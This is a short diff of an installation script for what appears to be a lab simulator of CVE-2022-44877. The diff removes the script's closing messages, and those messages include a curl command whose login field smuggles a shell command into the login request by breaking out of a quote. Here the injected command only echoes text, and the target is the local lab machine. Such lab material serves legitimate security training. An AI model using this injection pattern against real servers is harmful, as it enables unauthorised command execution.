@@ -165,12 +165,4 @@ sudo systemctl enable lighttpd
 
 log "CVE-2022-44877 Simulator installation finished! ------------------------"
 
-
-echo ""
-log "To exploit the virtual machine, please use following curl command:"
-log "curl -v -X POST -d 'login=admin\" ; echo "You have been hacked!!!" ; echo \"' http://$IP_enp0s8/login/index.php"
-echo ""
-echo ""
-log "Thanks for using the CVE-2022-44877 Simulator installation script"
-
 exit 0
